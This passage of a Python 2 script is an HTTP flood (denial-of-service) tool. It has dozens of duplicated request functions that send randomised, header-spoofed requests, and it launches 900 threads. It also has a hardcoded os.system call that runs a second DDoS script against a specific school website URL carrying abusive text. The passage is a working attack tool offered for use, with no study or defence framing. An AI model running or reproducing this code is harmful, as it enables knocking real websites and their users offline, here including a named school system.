	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall33(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall34(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall35(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall36(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall37(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall38(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall39(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall40(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall41(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall42(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall43(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall44(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall45(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall46(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall47(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall48(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall49(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall50(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:			    
				code=httpcall(url)
				code=httpcall1(url)
				code=httpcall2(url)
				code=httpcall3(url)
				code=httpcall4(url)
				code=httpcall5(url)
				code=httpcall6(url)
				code=httpcall7(url)
				code=httpcall8(url)
				code=httpcall9(url)
				code=httpcall10(url)
				code=httpcall11(url)
				code=httpcall12(url)
				code=httpcall13(url)
				code=httpcall14(url)
				code=httpcall15(url)
				code=httpcall16(url)
				code=httpcall17(url)
				code=httpcall18(url)
				code=httpcall19(url)
				code=httpcall20(url)
				code=httpcall21(url)
				code=httpcall22(url)
				code=httpcall23(url)
				code=httpcall24(url)
				code=httpcall25(url)
				code=httpcall26(url)
				code=httpcall27(url)
				code=httpcall28(url)
				code=httpcall29(url)
				code=httpcall30(url)
				code=httpcall31(url)
				code=httpcall32(url)
				code=httpcall33(url)
				code=httpcall34(url)
				code=httpcall35(url)
				code=httpcall36(url)
				code=httpcall37(url)
				code=httpcall38(url)
				code=httpcall39(url)
				code=httpcall40(url)
				code=httpcall41(url)
				code=httpcall42(url)
				code=httpcall43(url)
				code=httpcall44(url)
				code=httpcall45(url)
				code=httpcall46(url)
				code=httpcall47(url)
				code=httpcall48(url)
				code=httpcall49(url)	
				code=httpcall50(url)	
				code=httpFlood(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

class HTTPThread1(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				code=httpcall1(url)
				code=httpcall2(url)
				code=httpcall3(url)
				code=httpcall4(url)
				code=httpcall5(url)
				code=httpcall6(url)
				code=httpcall7(url)
				code=httpcall8(url)
				code=httpcall9(url)
				code=httpcall10(url)
				code=httpcall11(url)
				code=httpcall12(url)
				code=httpcall13(url)
				code=httpcall14(url)
				code=httpcall15(url)
				code=httpcall16(url)
				code=httpcall17(url)
				code=httpcall18(url)
				code=httpcall19(url)
				code=httpcall20(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Send" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- SELESAI '-' --"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
	    
		print "---- STARTING ----"
		os.system('python2 ddosZx1.py http://sman19jkt.net/cbt/index.php?pderr=Kontol+Kontol+Kurang+best+klo+gk+invet+web+dev+sesungguhnya')
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(http?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(900):
			t = HTTPThread()
			t = HTTPThread1()
			t.start()
		t = MonitorThread()
		t.start()
